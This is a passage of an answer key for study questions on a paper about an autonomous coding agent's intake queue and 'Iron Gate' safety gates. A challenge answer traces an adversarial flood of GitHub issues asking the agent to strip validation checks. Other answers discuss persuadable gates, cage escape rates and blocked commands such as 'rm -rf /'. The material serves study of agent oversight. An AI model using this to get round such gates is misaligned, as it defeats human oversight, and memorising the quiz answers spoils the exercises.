+<p><code>_coalesce_key</code> groups envelopes by their sorted target files joined with "|", which implements "same file" from §52.8. Envelopes with empty <code>target_files</code> do not share an empty key. They fall back to the envelope's provenance <code>signature</code>, and failing that to its unique <code>idempotency_key</code>, so they never merge. The docstring says why: soak bt-2026-05-17-213727 merged two distinct problems into one "Frankenstein" operation through the shared empty key. This edge case was found after the April paper and fixed in the same structural way §53 describes.</p>
+<p class="ak-q">Advanced A1. The paper describes exploration-first enforcement twice, and the two descriptions disagree. §52.5 (Refinement 12) says the check runs "at VALIDATE time" and that violations "produce a warning and are recorded in the per-candidate ledger." §47.2 says the Iron Gate runs post-GENERATE, pre-VALIDATE, and that violations produce a GENERATE_RETRY. Which is authoritative, and why does the difference matter?</p>
+<p>The two passages describe different strengths of the same rule. §52.5 describes a soft, observational check: a warning plus a ledger record, applied after the candidate already exists. §47.2 describes a hard gate: the candidate is rejected and the model is sent back with targeted feedback before VALIDATE spends anything on it. The paper does not reconcile them.</p>
+<p>The current code sides with §47.2. In <code>backend/core/ouroboros/governance/phase_runners/generate_runner.py</code>, the GENERATE runner raises <code>ExplorationInsufficientError</code> and advances the context to <code>OperationPhase.GENERATE_RETRY</code>. So the gate is enforced in GENERATE, not only logged at VALIDATE. A plausible reading is that §52.5 records the refinement as first written, and §47.2 and §47.3 record where it ended up. That fits §53's claim that the refinements were hardened over time. The paper itself does not say this, so treat it as an inference.</p>
+<p>The difference matters for two reasons. First, cost: a soft check lets an unexplored candidate consume a VALIDATE run (a sandbox and a test suite) before anyone notices, while the hard gate stops it earlier. Second, behaviour: only a hard gate produces the retry feedback that §47.5's Session G adaptation depends on. A warning in a ledger teaches the model nothing. It also matters for §93.6, because the 30B's 106 in-loop rejections came from this gate being hard. A soft check would have let those candidates through to VALIDATE instead.</p>
+<p class="ak-q">Advanced A2. Refinement 14 snapshots file hashes at GENERATE and compares them at APPLY, as a soft gate (§52.7). By October, operations execute in isolated sovereignty worktrees, accumulate on a session branch, and are fast-forwarded onto local <code>main</code> (§93.7). Writes are also verified by a SHA-256 check on disk (§93.2). Where does stale-state detection live now, and is Refinement 14 still pulling its weight?</p>
+<p>Refinement 14 guards a shared working tree: two operations read and write the same files, and a candidate built on an old read can overwrite a newer change. The October path changes that setting. Each operation executes in its own worktree on <code>ouroboros/auto/&lt;session&gt;-&lt;nonce&gt;</code>, so concurrent operations no longer write to the same files on disk. Stale state then shows up at integration time instead: landings are combined on the accumulation branch and promoted to <code>main</code> fast-forward only (§93.7). A fast-forward refuses to go ahead if <code>main</code> has moved in a way that would need a merge, so divergence cannot be silently overwritten there.</p>
+<p>§93.2 adds a related but different guarantee. The two-phase commit means a write is claimed only after the bytes on disk are checked with SHA-256. That catches the phantom <code>written=True</code> class, a write that never actually happened. It does not catch a write built on stale input. These are three checks with three different questions: was the input current (Refinement 14), did the write happen (§93.2), and can the result integrate cleanly (fast-forward promotion).</p>
+<p>A fair position is that Refinement 14 is still useful but no longer the main defence. Inside one worktree it still catches a candidate whose GENERATE-time read differs from the APPLY-time file, for example when a multi-file operation edits a file it read earlier. The evidence that would settle whether it can be retired is how often its warning fires per soak under worktree execution. If that count is near zero across long soaks, the isolation has made it redundant. If it fires, it is catching something promotion would only find later.</p>
+<p class="ak-q">Advanced A3. §53 argues that "structural fixes outperform configurational patches," and that most refinements changed the architecture. Test that claim against the §52 table itself and against what §93 found about mechanisms that existed but did nothing.</p>
+<p>Against the table, the claim is only partly supported. Four of the twelve refinements are listed in the table by an environment variable (R11 <code>JARVIS_FILE_LOCK_TTL_S</code>, R15 <code>JARVIS_COALESCE_WINDOW_S</code>, R17 <code>JARVIS_NOTIFY_APPLY_DELAY_S</code>, R19 <code>JARVIS_MAX_EXPLORATION_ROUNDS</code>), and R12's text in §52.5 adds a fifth, <code>JARVIS_MIN_EXPLORATION_CALLS</code>. Each of these still adds a mechanism, though: a TTL, a merge window, a delay, a cap. The env var tunes it rather than replacing it. R13 is the odd one out. Its "fix" is a comment saying an <code>asyncio.Lock</code> would be needed under multi-threading (§52.6), which is documentation, not structure. R14 is structural but soft. A fair reading is that most refinements add structure, and §53 overstates how cleanly they divide.</p>
+<p>§93 adds a sharper point: structure is necessary but not sufficient. §93.8 found that VALIDATE's repair rungs "had existed before" but were inert. There were 524 byte-identical retry iterations re-validating a frozen pool, and 532 micro-fix runs with zero repairs. §93.12 found 131 features "DARK": flag on, module on disk, nothing in production importing it. Refinement 10 (§52.3) is itself an early example: the L2 repair mechanism existed, but its output never reached disk.</p>
+<p>So the lesson in §53 needs a third clause. A structural fix counts only once it is shown to be reached and to have an effect in a live run. That is exactly what the reachability ledger (registered, then invoked, then effective) and <code>/reach</code> were built to measure (§93.12). The evidence that settles any one refinement is its "effective" count from a live soak, not the presence of the code.</p>
+<p class="ak-q"><strong>Challenge 1 (research).</strong> Refinement 18 (§52.11, §49.4) compares the success rate "before and after the first lesson was recorded," every 10 post-lesson operations, and clears the buffer if the post-lesson rate is lower. §49 says every operation produces a lesson, success or failure. Work out how many operations the "before" window can contain in a sequential session. Then estimate the noise in a 10-operation success rate when the true rate is 0.5. Frame an experiment that tests whether the metric clears lessons for the right reason. Give the hypothesis, metric, control, and the result that would falsify it.</p>
+<p><strong>The "before" window.</strong> §49 says every operation produces a success or failure lesson, and §49.3 still records infra failures (it only excludes them from injection). In a sequential session, the first operation to finish records the first lesson, so the "before" window holds one operation. Its success rate is 0% or 100%. Concurrency could put a few operations in it, but the window stays tiny. This assumes the counters are not reset elsewhere. The paper does not say, so state it as an assumption.</p>
+<p><strong>The consequence.</strong> If the first operation succeeded, the baseline is 100%, so any post-lesson window with even one failure is "lower" and the buffer is cleared at the first check. If the first operation failed, the baseline is 0% and the buffer can never be cleared. The verdict is decided mostly by the outcome of one operation, not by what the lessons did.</p>
+<p><strong>The noise.</strong> For n = 10 and p = 0.5, the standard error is the square root of 0.25/10, about 0.158. Two windows with the same true rate will often differ by 15 to 30 percentage points by chance. A single operation moves a 10-operation rate by 10 points.</p>
+<p><strong>The experiment.</strong></p>
+<ul>
+<li><em>Hypothesis H1:</em> buffer clears under Refinement 18 are predicted by the first operation's outcome and are not associated with a real drop caused by lessons.</li>
+<li><em>Metric:</em> for each session, whether a clear occurred, the first operation's outcome, and the VALIDATE pass rate of operations with lessons injected against operations with them withheld.</li>
+<li><em>Control:</em> within each session, withhold lesson injection from a random half of eligible operations. Run the metric on both arms, so a clear can be compared with an actual difference between the arms.</li>
+<li><em>Falsification:</em> H1 is falsified if clears happen about equally often after a successful and after a failed first operation, and sessions with clears show a real gap where injected operations do worse than withheld ones.</li>
+</ul>
+<p><strong>A proposal (not in the paper).</strong> If H1 holds, replace the single-operation baseline with the withheld arm running alongside, and require a minimum sample before any clear. To check the derivation, simulate sessions with lessons that have no effect at p = 0.5. Under the rule as specified, about half the sessions should clear at the first check, because a successful first operation sets a 100% baseline and a 10-operation window at 0.5 almost never reaches 100%.</p>
+<p class="ak-q"><strong>Challenge 2 (systems design).</strong> Redesign Refinement 19 (an exploration cap of 5 rounds, §52.12) for the October hardware: one RTX 5090, no paid lanes, 32,768 tokens of context, prefill about 6.5k tok/s, decode p50 172 tok/s (§93.6). Assume a base prompt of 12,000 tokens. Assume each <code>read_file</code> returns about 3,000 tokens, <code>git_log</code> 800, <code>get_callers</code> 500 and <code>glob_files</code> 300. Assume about 60 tokens of decode per tool call and a 1,500-token diff answer. Check time and context for an <code>architectural</code> operation, which needs 4 categories including call_graph and history (§47.3), on the 180 s COMPLEX budget (§42.5). Find the binding constraint and propose a cap that respects it.</p>
+<p><strong>The minimal compliant path.</strong> One call per category: <code>read_file</code> (COMPREHENSION, 3,000), <code>glob_files</code> (DISCOVERY, 300), <code>get_callers</code> (CALL_GRAPH, 500), <code>git_log</code> (HISTORY, 800). Tool results come to 4,600 tokens. The prompt then holds 12,000 + 4,600 = 16,600 tokens, which leaves about 16,200 for the answer. That is four rounds, inside the cap of 5. Whether it clears the score of 14.0 depends on weights the paper does not publish, so a fifth call may be needed.</p>
+<p><strong>Time.</strong> Prefill: in the worst case, with no KV reuse, each round re-reads the whole prefix. Five rounds at about 12,000 to 16,600 tokens each is under about 75,000 tokens, which at 6.5k tok/s is about 11.5 s. Decode: 5 calls × 60 tokens = 300 tokens, about 1.7 s, plus the 1,500-token diff, about 8.7 s. The total is roughly 22 s, well inside 180 s. Time is not the binding constraint.</p>
+<p><strong>Context.</strong> Now suppose the model spends all five rounds on full-file reads: 5 × 3,000 = 15,000 tokens of results. The prompt is then 27,000, which leaves about 5,800 tokens for output. A 1,500-token diff still fits. A whole-file answer does not. §93.11 found that 86% of training prompts asked for whole-file rewrites that "cannot fit the completion window," and §93.14 item 3 reports 219 whole-file answers against 6 diffs in the 10-09 soak. Context is the binding constraint, and a round count does not measure it. Five small calls and five large reads both count as "5".</p>
+<p><strong>Proposed design (not in the paper).</strong></p>
+<ol>
+<li>Reserve the completion window first. For example, keep 8,000 tokens for the answer, and let the exploration budget be the context minus the base prompt minus that reserve: 32,768 − 12,000 − 8,000, or about 12,700 tokens.</li>
+<li>Cap exploration in tokens, not rounds. When the next result would exceed the budget, return a truncated or symbol-scoped view instead. §93.6 shows a signed <code>target_symbol</code> cut generation scope from about 126,600 tokens to about 750.</li>
+<li>Make the cap and the floor consistent. Tool masking forces tool calls until the minimum is met (§93.6). If duplicates earn zero credit (§47.3), a model can hit the cap while still below the floor and then be rejected on retry. Allow the cap to extend only for calls that cover a still-missing required category.</li>
+<li>Keep the §52.12 nudge ("produce your final code change now") when the token budget is spent.</li>
+</ol>
+<p><strong>Justification and check.</strong> This keeps Principle 3 (no polling) and the Iron Gate untouched, adds no paid lane, and targets the failure §93.14 names as the leading cause of death. To check it, recompute with your own token sizes. The design is right if the reserved answer window survives in the worst case: (base + exploration budget + reserve) must not exceed 32,768.</p>
+</div>
+<div class="answer-key-unit" id="ak-part-ix">
+<h4>PART IX — The Intake Layer</h4>
+<p class="ak-q">Pause and predict 1. A signal has survived the event spine's debouncing and fingerprinting and a sensor has turned it into a <code>SignalEnvelope</code>. What questions do you think the final gate must still ask before the envelope may reach the pipeline?</p>
+<p>The <code>UnifiedIntakeRouter</code> asks four: is it a duplicate of a recent signal (<code>dedup_key</code>), does it conflict with a file already under operation (<code>file_lock</code>), what is its priority score, and can it be coalesced with a recent similar envelope (<code>coalesce_window</code>). The output is a sorted priority queue with conflicts and coalescing already applied. See §56.</p>
+<p class="ak-q">Conceptual 1. Why does the intake layer use four separate storm-protection layers instead of one strong deduplicator?</p>
+<p>Each layer sits at a different stage and catches a different kind of repeat. <code>FileWatchGuard</code> absorbs bursts of file saves with a 0.3s debounce, checksums and an LRU cache; the <code>TrinityEventBus</code> drops identical events from many producers with a 60s SHA-256 fingerprint window; <code>TestFailureSensor</code> waits 2s before spawning pytest; and the router's envelope <code>dedup_key</code> stops duplicate operations. The paper calls the layers orthogonal: they compose, so an actionable event has already passed at least two of them. One deduplicator at the end would let every burst travel through the bus and spawn pytest runs before it was suppressed. See §55.2.</p>
+<p class="ak-q">Conceptual 2. The intake layer is push-based, yet every sensor keeps <code>scan_once()</code> and its poll loop. Is that a contradiction?</p>
+<p>No. Push is the primary path because it gives low latency: producers publish to the event spine immediately and sensors subscribe (Manifesto §3). The poll loops are kept as safety nets for when the event spine is unavailable, and <code>scan_once()</code> serves manual or CLI use. So push makes the common case fast, and polling makes sure detection still works when the push path fails. See §54 and §55.</p>
+<p class="ak-q">Conceptual 3. The WAL exists for disaster recovery, but it also caused a bug. What was the bug, and what does the fix teach about recovery mechanisms?</p>
+<p>The WAL in <code>.jarvis/intake_wal.jsonl</code> is replayed on restart so a crashed harness does not lose pending work. In Session N, replay put stale envelopes from a crashed session beside fresh ones, and coalescing merged them into one operation, half of it from the old session. The fix guards coalescing by session id, so envelopes from different sessions never merge, and stale entries are pruned by TTL. The lesson is that recovered state needs its origin recorded. Otherwise the recovery path quietly mixes old intent with new. See §56.2, §56.3 and §63.1.</p>
+<p class="ak-q">Quiz 1. Which storm-protection layer removes duplicates using a SHA-256 fingerprint over a 60-second window?</p>
+<p><strong>C.</strong> The TrinityEventBus does SHA-256 fingerprint dedup with a 60s window. FileWatchGuard debounces and checksums, TestFailureSensor debounces before spawning pytest, and the router uses <code>dedup_key</code>. See §55.2.</p>
+<p class="ak-q">Quiz 2. The 16-slot priority queue is full and a new envelope arrives. What does the paper say happens?</p>
+<p><strong>D.</strong> When the queue is full, the lowest-priority envelopes are evicted and logged. They can be re-ingested if the sensor fires again. See §56.1.</p>
+<p class="ak-q">Quiz 3. When is an envelope's entry cleared from the intake WAL?</p>
+<p><strong>A.</strong> WAL entries are cleared when the pipeline picks the envelope up, that is, when it transitions to <code>dispatched</code>. Stale entries from crashed sessions are pruned by TTL. See §56.2.</p>
+<p class="ak-q">Quiz 4. In a deployment where <code>repo_registry</code> is not set, how are sensors instantiated?</p>
+<p><strong>B.</strong> Sensors fan out per registered repo when <code>repo_registry</code> is set. Otherwise each falls back to a single "jarvis" sensor. Cross-repo drift is handled separately by CrossRepoDriftSensor. See §55.3.</p>
+<p class="ak-q"><strong>Problem 1 (trace).</strong> A developer saves a <code>.py</code> file twice within 0.2 seconds, and the change breaks a test. Trace the signal from the file save to a queued envelope. Name each component it passes and say which storm-protection layer acts at each step.</p>
+<p>The save is seen by <code>FileWatchGuard</code> (watchdog), via the Phase 1 <code>FileSystemEventBridge</code>. Its 0.3s debounce and checksum dedup fold the two saves into one change (layer 1). It publishes an <code>fs.changed.*</code> event to the TrinityEventBus, which drops any identical fingerprint seen within 60s (layer 2).</p>
+<p><code>TestFailureSensor</code> subscribes to debounced <code>.py</code> changes and waits 2s before spawning pytest (layer 3). The pytest plugin writes <code>.jarvis/test_results.json</code>, and the sensor emits a <code>SignalEnvelope</code> for the failure.</p>
+<p>The <code>UnifiedIntakeRouter</code> checks the <code>dedup_key</code> (layer 4) and the file lock, scores priority, and checks whether to coalesce. It then places the envelope in the 16-slot priority queue, which is persisted to <code>.jarvis/intake_wal.jsonl</code>. See §54, §55.1, §55.2 and §56.</p>
+<p class="ak-q"><strong>Problem 2 (design).</strong> A teammate says: "The paper tells us to <code>rm .jarvis/intake_wal.jsonl</code> before every session anyway, so let us delete the WAL entirely and keep the queue only in memory." Evaluate the proposal using the paper's reasons for the WAL and its account of the Session N bug.</p>
+<p>The WAL is disaster recovery. When a harness crashes, replaying the log rehydrates the queue so pending work is not lost (§56.2). An in-memory queue would lose every pending envelope on a crash.</p>
+<p>The cleanup step and the Session N bug are a different problem. Replay merged stale envelopes into fresh operations through coalescing (§56.3, §63.1). The structural fix is the session-id guard on coalescing, plus TTL pruning of stale entries. Neither requires removing the log.</p>
+<p>So the proposal trades a real recovery guarantee for a problem that is already solved more narrowly. A better position is to keep the WAL and keep the session guard, and treat the manual cleanup as a clean-start step for controlled test sessions.</p>
+<p class="ak-q"><strong>Problem 3 (code reading).</strong> Open <code>backend/core/ouroboros/governance/intake/unified_intake_router.py</code> and find <code>_dedup_window_s</code> and <code>_is_duplicate</code>. Which envelope source gets a different window? What are the two default window lengths in the router's config? What window value turns deduplication off? Relate this to storm-protection layer 4 in §55.2.</p>
+<p><code>_dedup_window_s</code> returns <code>voice_dedup_window_s</code> when <code>envelope.source == "voice_human"</code>, and <code>dedup_window_s</code> otherwise. The config defaults are 300.0 seconds for voice and 600.0 seconds for everything else.</p>
+<p><code>_is_duplicate</code> returns False when the window is 0 or less, so a zero window disables deduplication. Otherwise it looks up the last monotonic time recorded for the envelope's <code>dedup_key</code> and reports a duplicate if that time falls inside the window.</p>
+<p>This is layer 4 of §55.2, "envelope <code>dedup_key</code> prevents duplicate operations." The code adds one detail the paper does not state: the window is shorter for human voice commands than for sensor-generated signals.</p>
+<p class="ak-q">Advanced A1. The 16-slot queue evicts its lowest-priority envelope and says it "may be re-ingested if the sensor fires again." In a push-based intake layer, when could an eviction quietly become permanent, and why does that matter more after §93's supply wall?</p>
+<p>Eviction is only temporary if the sensor fires again (§56.1). Under the push model, most sensors fire on events: <code>OpportunityMinerSensor</code> and <code>TodoScannerSensor</code> react to <code>fs.changed.*</code> on <code>*.py</code>, and <code>DocStalenessSensor</code> reacts to file changes and <code>git_events.json</code> (§54). The poll loops are kept only as safety nets "when the event spine is unavailable" (§54). So if a file never changes again while the spine is healthy, an evicted signal about it has no path back except a manual <code>scan_once()</code>.</p>
+<p>The priority formula tends to push these sources to the bottom of the queue. In §50.2, <code>opportunity_miner</code> and <code>doc_staleness</code> sit at source tiers 5 and 6, and with a file-count penalty and no urgency boost (§50.1) they are the likeliest to be evicted. The loss is therefore concentrated on the low-urgency improvement work. In April that looked like an acceptable cost. In October, §93.10 reports a supply wall: after about four hours, yield is bounded by the supply of landable work, not by the model. A queue that silently drops candidate work makes the binding constraint worse.</p>
+<p>My position is that eviction should stay, since a bounded queue is a storm defence, but it should be paired with a re-scan of what was evicted once the queue drains. The evidence that would settle it: per-source eviction counts from the eviction log, set against the share of those evicted files that were later re-ingested. A low re-ingest rate for event-driven sources would show the loss is real.</p>
+<p class="ak-q">Advanced A2. Gate 12 force-releases any file lock older than 300s (§58.12). Combine that with the operation durations in Part XI. What can happen if an operation is slow but not crashed, and which later gate notices?</p>
+<p>The TTL assumes that a lock older than 300s belongs to a crashed operation (§58.12 and Refinement #11). Part XI shows that healthy operations routinely run far longer. Session W's op ran from its VALIDATE iteration at 16:14:18 to its last DECISION at 16:23:02, more than 500s (§65.4). L2 alone is now given a fresh 600s timebox, and Session L raised the complex worker ceiling to 1800s (§63.1).</p>
+<p>So a slow, healthy op can lose its lock partway through. The router's <code>file_lock</code> check then sees no conflict for that file (§56), and a second signal for the same file can dispatch a second operation. Two candidates can now be built against the same file.</p>
+<p>The only gate positioned to notice is Gate 11. It recomputes target hashes at APPLY and compares them with GENERATE-time hashes (§58.11). But a mismatch "produces a warning and ledger entry". It does not reject. The paper's design therefore detects this race and records it, but it does not prevent it. A sound fix would make the TTL longer than the longest legal operation, or have live operations renew their lock. Either is a proposal, not something the paper describes.</p>
+<p class="ak-q">Advanced A3. §56.3 tells the operator to delete <code>.jarvis/intake_wal.jsonl</code> before each session. Is that still a sound step once O+V runs as a long-lived daemon, as described in §93?</p>
+<p>The manual cleanup made sense for April's battle tests. Each one was a discrete session that a human started, and Session N had just shown replay mixing stale and fresh envelopes (§63.1). By October, a bare <code>ov</code> attaches to a running organism or cold-boots one in the background (§93.9), and soaks run for hours, up to about 9 h (§93.10). One soak even ended with its VM stopped mid-run (§93.10).</p>
+<p>The cleanup step deletes exactly what the WAL exists to protect: pending work from a crashed session (§56.2). Meanwhile the structural defences against Session N are already in place. Coalescing is guarded by session id, so old and new envelopes never merge (§56.3), and stale entries are pruned by TTL (§56.2). The remaining risk is weaker: a replayed envelope still competes for dispatch on its composite score, since §50.3 scores WAL replay like any other enqueue path, even if its target has since changed.</p>
+<p>My position: retire the manual delete for daemon operation and rely on the session guard and TTL. Keep the delete only for controlled experiments that need a clean start. To settle it, count how many replayed envelopes after a crash went on to land useful work, and how many produced stale or duplicate operations.</p>
+<p class="ak-q"><strong>Challenge 1 (adversarial).</strong> The repository is public, so anyone can open GitHub issues. An adversary opens 40 issues in ten minutes. Each has a different title and body, and each asks O+V to "simplify" a different module by removing a validation check. GitHub delivers every event with a valid Standard Webhooks signature. Trace the flood through the intake layer and say which layer, if any, stops it. Then say what bounds the damage downstream, using the October pipeline in §93.7.</p>
+<p><strong>Gate 10 passes every event.</strong> Gate 10 verifies HMAC-SHA256 signatures and rejects unsigned or wrongly signed webhooks (§58.10). These events really were sent by GitHub, so they pass. The signature proves the sender of the webhook, not the trustworthiness of whoever wrote the issue.</p>
+<p><strong>Storm protection does not help.</strong> The four layers suppress repeats (§55.2). <code>FileWatchGuard</code> and the TestFailureSensor debounce are not on this path. The TrinityEventBus SHA-256 fingerprint differs for each issue because each body differs. The router's <code>dedup_key</code> differs because each issue targets a different module. Coalescing only merges envelopes for the same file (§52.8), and each issue names a different one. None of these layers is a defence against distinct, well-formed requests. They were never meant to be.</p>
+<p><strong>The queue bounds the volume, not the content.</strong> At most 16 envelopes are held, and the rest are evicted by priority (§56.1). The file lock allows one operation per file (§56). That limits how fast the flood is processed. It does not decide whether any request should be done.</p>
+<p><strong>Downstream.</strong> Each surviving envelope goes through CLASSIFY, the Iron Gate and VALIDATE. Protected paths (§58.2) refuse edits to <code>.env</code>, credentials, <code>.git/</code> and supervisor core files, but an ordinary module is not protected. In the October configuration, the Sentinel auto-approves up to <code>APPROVAL_REQUIRED</code> by default. Only BLOCKED operations, Order-2 self-modification and anything touching the cage always escalate (§93.7). So a human approval is not guaranteed to catch a weakening edit to an ordinary module. What remains is the promotion gate (provenance, coverage, no vanished public symbol) and the zero-push air-gap, which keeps anything that lands on local <code>main</code> until the operator publishes it (§93.7).</p>
+<p><strong>Conclusion.</strong> No intake layer stops this flood, and the paper does not claim one does. The damage is bounded by queue capacity, per-file locking, the gates and the air-gap. A real fix would be an intake trust rule, such as accepting issue-triggered work only from allow-listed authors or labels. That is a proposal, not a mechanism the paper describes. To check the trace, confirm that each storm layer in §55.2 deduplicates on identity, and that none of them judges intent.</p>
+<p class="ak-q"><strong>Challenge 2 (quantitative).</strong> The intake queue is full: 16 envelopes, and the lowest-priority entries are two at priority 6, one <code>opportunity_miner</code> (normal, 4 files, confidence 0.70) and one <code>doc_staleness</code> (low, 1 file, 0.85, no dependency credit). Three envelopes then arrive in order. (1) <code>doc_staleness</code>, low urgency, 1 file, confidence 0.92, no dependency credit. (2) <code>opportunity_miner</code>, high urgency, 2 files, confidence 0.95, three envelopes queued behind its file set. (3) <code>test_failure</code>, critical, 1 file, confidence 0.95, no dependency credit. Use the source tiers from §50.2 (test_failure 2, opportunity_miner 5, doc_staleness 6). Compute each new priority, decide what is evicted at each step, and name any decision the paper leaves unspecified.</p>
+<p>The formula is <code>base - urgency + cost_penalty - confidence_bonus - dep_credit</code>. The urgency boost is critical 3 and high 1. The cost penalty is 0 for one file, 1 for two to four files, and 2 above that. The confidence bonus is 1 at 0.9 or above. Dependency credit is capped at 3 (§50.1).</p>
+<ol>
+<li><strong>Arrival 1:</strong> 6 - 0 + 0 - 1 - 0 = <strong>5</strong>. It outranks both priority-6 entries, so one of them is evicted. The two existing entries are tied at 6. As a check, the opportunity_miner entry is 5 - 0 + 1 - 0 - 0 = 6, the same as §50.2's signal B. <strong>The paper does not say which tied entry is evicted.</strong></li>
+<li><strong>Arrival 2:</strong> 5 - 1 + 1 - 1 - 3 = <strong>1</strong>. The remaining priority-6 entry is now the lowest, so it is evicted.</li>
+<li><strong>Arrival 3:</strong> 2 - 3 + 0 - 1 - 0 = <strong>-2</strong>, matching §50.2's signal A. The lowest remaining entry is evicted. That is either arrival 1 at 5 or some other entry, depending on the 13 entries not described.</li>
+</ol>
+<p><strong>Second-order effect.</strong> Both evicted entries came from event-driven sensors (§54). They return only if their files change again, or if someone runs <code>scan_once()</code> by hand. An evicted opportunity-miner signal also loses whatever dependency credit it might have earned later. Arrival 2 shows how much that credit is worth: 3 points, which is more than the whole gap between a normal and a critical signal in the urgency term.</p>
+<p><strong>Unspecified behaviour.</strong> The paper leaves two things open: the tie-break among equal priorities, and what happens when the newcomer itself is the lowest-priority envelope. A reasonable reading of §56.1 is that the newcomer is then the one evicted, but the text does not say so.</p>
+<p>To check the arithmetic, recompute §50.2's three rows with the same formula. You should get -2, 6 and 4.</p>
+</div>
+<div class="answer-key-unit" id="ak-part-x">
+<h4>PART X — The Iron Gate: Safety Philosophy</h4>
+<p class="ak-q">Pause and predict 1. In most autonomous-AI systems, more safety means less autonomy. After reading twelve hard gates, predict: does adding more Iron Gate rules give O+V less autonomy or more? Why?</p>
+<p>More. Because the gate is structural, operations that pass it do not need human approval. Default-allow tools are safe, and low-risk operations auto-apply because the gate has already vetted them. The trade-off flips: more Iron Gate means fewer approvals and so more autonomy. Approval remains only where the gate cannot decide (<code>APPROVAL_REQUIRED</code>). See §60.</p>
+<p class="ak-q">Conceptual 1. Why must the Iron Gate be pre-linguistic and model-uninfluenced, rather than a careful reviewer that reads the model's reasoning?</p>
+<p>The paper's claim is that an autonomous system is safe only if its safety layer cannot be talked out of its decisions. A gate that reads natural language can be persuaded by a well-argued rationale. The Iron Gate reads only file paths, AST nodes, tokens, exit codes and command strings, so no prompt can change its verdict. The protected-paths example makes this concrete: a model that "reasons" about why it needs to modify <code>.env</code> is still refused. Determinism and logging then make every decision repeatable and auditable. See §57 and §58.2.</p>
+<p class="ak-q">Conceptual 2. The paper accepts that the gate will sometimes reject a valid operation. Why is that an acceptable cost?</p>
+<p>§59 says the gate is not an oracle. False positives are acceptable because a rejected operation can be retried with different inputs. The errors the gates exist to stop are often irreversible: <code>rm -rf /</code>, a forced push to main, leaked credentials, unbounded spend. A conservative, hand-curated rule that sometimes says no costs one retry. A clever rule that sometimes says yes to the wrong thing can cost the repository. Keeping one deterministic rule per gate, with no voting and no intent reasoning, keeps each verdict predictable. See §58.3 and §59.</p>
+<p class="ak-q">Conceptual 3. Gates 8, 9 and 12 (approval timeouts, worker ceilings, file-lock TTL) do not inspect code at all. Why do they belong in a safety inventory?</p>
+<p>They protect liveness rather than correctness. An unanswered approval would block forever without the 600s timeout that moves it to <code>CANCELLED</code>. A wedged worker would hold a pool slot forever without the wall-clock ceiling. A crashed operation's file lock would starve every later operation on that file without the 300s TTL. Each is still a deterministic rule the model cannot override, which is the paper's definition of an Iron Gate. A safe system has to keep making progress, not only avoid bad writes. See §58.8, §58.9 and §58.12.</p>
+<p class="ak-q">Quiz 1. By default, how many exploration tool calls must the model make before a candidate may proceed to VALIDATE?</p>
+<p><strong>B.</strong> <code>JARVIS_MIN_EXPLORATION_CALLS</code> defaults to 2. The candidate is also blocked if the ExplorationLedger's diversity score is below the complexity-tier floor. See §58.4.</p>
+<p class="ak-q">Quiz 2. An approval request goes unanswered for longer than <code>approval_timeout_s</code>. What happens to the operation?</p>
+<p><strong>D.</strong> The default timeout is 600s, and an unanswered approval moves the operation to <code>CANCELLED</code> rather than waiting forever. See §58.8.</p>
+<p class="ak-q">Quiz 3. Which statement matches how §59 describes the Iron Gate?</p>
+<p><strong>C.</strong> The gate is not an oracle. It can produce false positives, which is acceptable because a rejected op can be retried. It is not an AI, not a consensus engine and not an approval queue. See §59.</p>
+<p class="ak-q">Quiz 4. At APPLY, Gate 11 finds that a target file's hash differs from its GENERATE-time hash. What does the paper say it does?</p>
+<p><strong>A.</strong> Gate 11 recomputes target hashes at APPLY, and a mismatch produces a warning and a ledger entry. Its purpose is to catch candidates built on stale state during concurrent modification. See §58.11.</p>
+<p class="ak-q"><strong>Problem 1 (trace).</strong> An operation's ROUTE phase expects four files. The model makes one <code>read_file</code> call. It then returns a candidate whose <code>files: [...]</code> list covers three of the four files, and one file contains a stray non-ASCII codepoint. Which post-GENERATE gates react, and what does each do? Can this candidate reach VALIDATE?</p>
+<p>Gate 4 (exploration-first): one call is below the default minimum of 2, so the candidate cannot proceed to VALIDATE (§58.4).</p>
+<p>Gate 5 (ASCII strictness): the codepoint is caught and, if possible, auto-repaired with an ASCII approximation. Only a failed repair would cause rejection (§58.5). On its own, this gate would not stop the candidate.</p>
+<p>Gate 6 (multi-file coverage): three of four declared files are covered, so the gate rejects. A partial multi-file change would leave the codebase inconsistent (§58.6).</p>
+<p>The candidate does not reach VALIDATE. The paper does not give an order for these checks, but either Gate 4 or Gate 6 alone is enough to stop it. None of these verdicts depend on the model's explanation of why it acted as it did.</p>
+<p class="ak-q"><strong>Problem 2 (design).</strong> Someone proposes replacing the hand-curated bash blocklist (Gate 3) with an LLM judge. The judge would read each command and decide whether it is dangerous, so it can catch new destructive patterns the list misses. Critique the proposal using Part X's philosophy and trade-off.</p>
+<p>An LLM judge breaks the properties that define the gate (§57). It reasons about language, so it is not pre-linguistic. Crafted input can influence it, so it is not model-uninfluenced. The same command could get different verdicts, so it is not deterministic. §59 also says the gate is explicitly not an AI.</p>
+<p>It would weaken §60's argument too. The autonomy dividend exists because a structural gate needs no human backstop. A persuadable judge would push the operator back toward approvals, so autonomy would shrink.</p>
+<p>A defensible variant keeps the blocklist as the authoritative gate, since the paper calls it expandable, and uses any model only as an advisory signal. For example, the model could propose new patterns for a human to add to the list. It would never decide whether a command runs.</p>
+<p class="ak-q"><strong>Problem 3 (code reading).</strong> Open <code>backend/core/ouroboros/governance/multi_file_coverage_gate.py</code>. Read the module docstring and <code>check_candidate</code>. What does the function return when the gate passes, and what when it fails? What happens for an operation with zero or one target file? What gate number does the file use for itself, compared with §58.6?</p>
+<p><code>check_candidate</code> returns <code>None</code> when the candidate is fine. Otherwise it returns a tuple <code>(reason, missing_paths)</code>, and the missing paths are echoed back to the model in retry feedback.</p>
+<p>If the operation has one target file or none (<code>len(targets) &lt;= 1</code>), the gate no-ops. It also no-ops when <code>JARVIS_MULTI_FILE_ENFORCEMENT</code> is set to false. Otherwise every target path must appear in the candidate's <code>files</code> list, and a legacy single-file candidate on a multi-target op is rejected with every target listed as missing. That matches §58.6.</p>
+<p>The docstring calls the file "Iron Gate 5" and explains the Session O background. §58.6 numbers it Gate 6 in the inventory, while §64.3 and §64.4 in the session log also say "Iron Gate 5". The numbering is not consistent across the paper. The gate's behaviour is the same either way.</p>
+<p>The file also contains later slices the paper does not cover, such as a subset-coverage exception for resolved test-to-source attribution.</p>
+<p class="ak-q">Advanced A1. §60 argues that more Iron Gate means more autonomy. §93.3 then measures a static-cage escape rate of about 8.8% against a 4.4% gate. Does the measurement undermine §60's argument, or only its scope?</p>
